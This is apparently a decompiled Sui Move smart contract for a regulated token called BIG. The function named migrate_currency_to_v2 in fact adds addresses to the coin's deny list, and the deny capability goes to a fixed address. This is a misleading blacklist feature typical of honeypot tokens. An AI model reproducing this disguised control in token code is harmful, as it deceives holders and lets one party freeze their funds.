module 0x142048f71aa95ccb8e850cc6d82d296556d6678a25ec9c54d5ac95228e42779b::big {
    struct BIG has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<BIG>, arg1: 0x2::coin::Coin<BIG>) {
        0x2::coin::burn<BIG>(arg0, arg1);
    }

    fun init(arg0: BIG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BIG>(arg0, 9, b"BIG", b"BIG", b"Believe In Greatness", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/dBNRYMk/ava.webp")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BIG>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BIG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BIG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BIG>>(v1, @0x7ef837740dc1eb90911e9053b03fa8d91b78c989018287eceb402fba5240bd32);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BIG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BIG>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<BIG>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<BIG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

